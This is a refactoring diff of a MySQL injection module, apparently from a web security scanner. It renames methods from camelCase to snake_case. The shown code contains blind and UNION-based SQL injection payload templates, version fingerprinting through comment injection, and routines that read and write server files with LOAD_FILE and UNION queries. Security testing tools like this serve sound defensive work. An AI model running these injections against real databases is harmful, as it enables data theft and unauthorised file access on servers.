@@ -47,7 +47,7 @@ class MySQLMap(Common):
 
         return 'CHAR(' + ','.join(ord_list) + ')'
 
-    def createStm(self):
+    def create_stm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR ORD(MID((%s), %d, %d)) > %d"
         elif self.args.injectionMethod == "stringsingle":
@@ -56,7 +56,7 @@ class MySQLMap(Common):
             evilStm = '" OR ORD(MID((%s), %d, %d)) > %d AND "1'
         return evilStm
 
-    def createExactStm(self):
+    def create_exact_stm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR MID((%s), %d, %d) = '%s' AND 1=1"
         elif self.args.injectionMethod == "stringsingle":
@@ -77,8 +77,8 @@ class MySQLMap(Common):
         elif self.args.injectionMethod == "stringdouble":
             stm = '" /* NoValue */ AND "1'
 
-        baseUrl = self.urlReplace(newValue=stm)
-        newResult = self.queryPage(baseUrl)
+        base_url = self.url_replace(newValue=stm)
+        newResult = self.query_page(base_url)
 
         if newResult != self.args.trueResult:
             warnMsg = "unable to perform MySQL comment injection"
@@ -107,8 +107,8 @@ class MySQLMap(Common):
                 elif self.args.injectionMethod == "stringdouble":
                     stm = '" /*!%s AND 1=2*/ AND "1' % version
 
-                baseUrl = self.urlReplace(newValue=stm)
-                newResult = self.queryPage(baseUrl)
+                base_url = self.url_replace(newValue=stm)
+                newResult = self.query_page(base_url)
 
                 if newResult == self.args.trueResult:
                     if version[0] == "3":
@@ -123,8 +123,8 @@ class MySQLMap(Common):
 
         return None
 
-    def getFingerprint(self):
-        actVer = self.parseFp("MySQL", self.__fingerprint)
+    def get_fingerprint(self):
+        actVer = self.parse_fp("MySQL", self.__fingerprint)
 
         if not self.args.exaustiveFp:
             return actVer
@@ -134,7 +134,7 @@ class MySQLMap(Common):
 
         comVer = self.__commentCheck()
         if comVer:
-            comVer = self.parseFp("MySQL", [comVer])
+            comVer = self.parse_fp("MySQL", [comVer])
             value += "\n%scomment injection fingerprint: %s" % (blank, comVer)
 
         if self.__banner:
@@ -144,12 +144,12 @@ class MySQLMap(Common):
             if re.search("-log$", self.__banner):
                 banVer += ", logging enabled"
 
-            banVer = self.parseFp("MySQL", [banVer])
+            banVer = self.parse_fp("MySQL", [banVer])
             value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)
 
         return value
 
-    def getBanner(self):
+    def get_banner(self):
         logMsg = "fetching banner"
         self.log(logMsg)
 
@@ -158,13 +158,13 @@ class MySQLMap(Common):
 
         return self.__banner
 
-    def getCurrentUser(self):
+    def get_current_user(self):
         logMsg = "fetching current user"
         self.log(logMsg)
 
         return self.get_value("current_user()")
 
-    def getCurrentDb(self):
+    def get_current_db(self):
         logMsg = "fetching current database"
         self.log(logMsg)
 
@@ -173,7 +173,7 @@ class MySQLMap(Common):
         else:
             return self.get_value("database()")
 
-    def getUsers(self):
+    def get_users(self):
         logMsg = "fetching number of database users"
         self.log(logMsg)
 
@@ -203,7 +203,7 @@ class MySQLMap(Common):
 
         return users
 
-    def getDbs(self):
+    def get_dbs(self):
         logMsg = "fetching number of databases"
         self.log(logMsg)
 
@@ -249,7 +249,7 @@ class MySQLMap(Common):
 
         return dbs
 
-    def getTables(self):
+    def get_tables(self):
         if not self.__has_information_schema:
             errMsg = "information_schema not available, "
             errMsg += "remote database is MySQL < 5.0"
@@ -257,7 +257,7 @@ class MySQLMap(Common):
 
         if not self.args.db:
             if not len(self.__cachedDbs):
-                dbs = self.getDbs()
+                dbs = self.get_dbs()
             else:
                 dbs = self.__cachedDbs
         else:
@@ -266,7 +266,7 @@ class MySQLMap(Common):
             else:
                 dbs = [self.args.db]
 
-        dbTables = {}
+        db_tables = {}
 
         for db in dbs:
             logMsg = "fetching number of tables for database '%s'" % db
@@ -300,21 +300,21 @@ class MySQLMap(Common):
                 tables.append(table)
 
             if tables:
-                dbTables[db] = tables
+                db_tables[db] = tables
             else:
                 warnMsg = "unable to retrieve the tables "
                 warnMsg += "for database '%s'" % db
                 self.warn(warnMsg)
 
-        if dbTables:
-            self.__cachedTables = dbTables
+        if db_tables:
+            self.__cachedTables = db_tables
         elif not self.args.db:
             errMsg = "unable to retrieve the tables for any database"
             raise Exception(errMsg)
 
-        return dbTables
+        return db_tables
 
-    def getColumns(self):
+    def get_columns(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
             raise Exception(errMsg)
@@ -390,7 +390,7 @@ class MySQLMap(Common):
 
         return tableColumns
 
-    def dumpTable(self):
+    def dump_table(self):
         if not self.args.tbl:
             raise Exception("missing table parameter")
 
@@ -400,7 +400,7 @@ class MySQLMap(Common):
             raise Exception(errMsg)
 
         if not self.__cachedColumns:
-            self.__cachedColumns = self.getColumns()
+            self.__cachedColumns = self.get_columns()
 
         logMsg = "fetching number of entries for "
         logMsg += "table '%s'" % self.args.tbl
@@ -478,19 +478,19 @@ class MySQLMap(Common):
 
         return columnValues
 
-    def getFile(self, filename):
+    def get_file(self, filename):
         logMsg = "fetching file: '%s'" % filename
         self.log(logMsg)
 
-        if self.args.unionUse:
-            return self.unionUse("SELECT LOAD_FILE('%s')" % filename)
+        if self.args.union_use:
+            return self.union_use("SELECT LOAD_FILE('%s')" % filename)
         else:
             return self.get_value("SELECT LOAD_FILE('%s')" % filename)
 
-    def writeFile(self, filename, content):
+    def write_file(self, filename, content):
         self.log('Writing %s with content: %s' % (filename, content))
 
-        union = self.unionCheck()
+        union = self.union_check()
         # union = http://localhost/w3af/blind_sqli/blind_sqli-integer.php?id=1 UNION SELECT NULL, NULL, NULL, NULL, NULL
         if union is None:
             raise Exception('Failed to find a valid SQL UNION.')
@@ -529,15 +529,15 @@ class MySQLMap(Common):
 
         for union in union_list:
             self.log('Using UNION: ' + union)
-            self.getPage(union)
+            self.get_page(union)
 
-    def getExpr(self, expression):
-        if self.args.unionUse:
-            return self.unionUse(expression)
+    def get_expr(self, expression):
+        if self.args.union_use:
+            return self.union_use(expression)
         else:
             return self.get_value(expression)
 
-    def checkDbms(self):
+    def check_dbms(self):
         logMsg = "testing MySQL"
         self.log(logMsg)
 
@@ -606,7 +606,7 @@ class MySQLMap(Common):
                 else:
                     self.__fingerprint = ["< 3.22.11"]
 
-            if self.args.getBanner:
+            if self.args.get_banner:
                 self.__banner = self.get_value("VERSION()")
 
             return True
@@ -616,7 +616,7 @@ class MySQLMap(Common):
 
             return False
 
-    def unionCheck(self):
+    def union_check(self):
         logMsg = "testing union on parameter '%s'" % self.args.injParameter
         self.log(logMsg)
 
@@ -637,8 +637,8 @@ class MySQLMap(Common):
             elif self.args.injectionMethod == "stringdouble":
                 checkStm = stm + ', "1'
 
-            baseUrl = self.urlReplace(newValue=checkStm)
-            newResult = self.queryPage(baseUrl)
+            base_url = self.url_replace(newValue=checkStm)
+            newResult = self.query_page(base_url)
 
             if not newResult in resultDict.keys():
                 resultDict[newResult] = (1, stm)
@@ -652,12 +652,12 @@ class MySQLMap(Common):
                     if element[0] == 1:
 
                         if self.args.httpMethod == "GET":
-                            value = baseUrl
+                            value = base_url
                             return value
 
                         elif self.args.httpMethod == "POST":
-                            url = baseUrl.split("?")[0]
-                            data = baseUrl.split("?")[1]
+                            url = base_url.split("?")[0]
+                            data = base_url.split("?")[1]
                             value = "url:\t'%s'" % url
                             value += "\ndata:\t'%s'\n" % data
                             return value
